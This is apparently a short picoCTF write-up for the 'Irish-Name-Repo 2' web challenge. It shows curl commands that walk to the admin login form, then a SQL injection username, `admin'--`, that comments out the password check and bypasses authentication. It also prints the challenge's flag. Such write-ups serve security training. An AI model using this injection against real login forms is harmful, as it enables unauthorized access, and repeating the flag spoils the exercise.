# PicoGym Web Exploitation Writeup

Author: [Kuldeep Singh Chouhan](https://github.com/kuldeep-singh-chouhan)

Challenge Page: [Irish-Name-Repo 2](https://jupiter.challenges.picoctf.org/problem/64649/)

## Walkthrough
To gather some information let's see the HTML source code by using 
`curl https://jupiter.challenges.picoctf.org/problem/64649/`.
A part of the source code hints towards `login.html`.
```html
<!-- Sidebar (hidden by default) -->
<nav class="w3-sidebar w3-bar-block w3-card w3-top w3-xlarge w3-animate-left" style="display:none;z-index:2;width:40%;min-width:300px" id="mySidebar">
  <a href="javascript:void(0)" onclick="w3_close()" class="w3-bar-item w3-button">Close Menu</a>
  <a href="support.html" class="w3-bar-item w3-button">Support</a>
  <a href="login.html" class="w3-bar-item w3-button">Admin Login</a>
</nav>
```

Let's go to `login.html` by `curl https://jupiter.challenges.picoctf.org/problem/64649/login.html`. Here, we see `login.php`
```html
<form action="login.php" method="POST">
        <fieldset>
            <div class="form-group">
                <label for="username">Username:</label>
                <input type="text" id="username" name="username" class="form-control">
            </div>
            <div class="form-group">
                <label for="password">Password:</label>
                <div class="controls">
                    <input type="password" id="password" name="password" class="form-control">
                </div>
            </div>
            <input type="hidden" name="debug" value="0">

            <div class="form-actions">
                <input type="submit" value="Login" class="btn btn-primary">
            </div>
        </fieldset>
    </form>
```
Try going to `login.php` by `curl https://jupiter.challenges.picoctf.org/problem/64649/login.php`. Login will fail. Try username as `admin'--` and password as `asdf` (anything).
`curl https://jupiter.challenges.picoctf.org/problem/64649/login.php --data "username=admin'--&password=asdf"`.
Flag found!!

## Flag
`picoCTF{m0R3_SQL_plz_aee925db}`

## Useful resources
Commenting in [SQL Injection](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/#LineCommentAttacks).

## Suggested modifications
Word `admin` could be filtered so that use of string concatenation operator could be made.
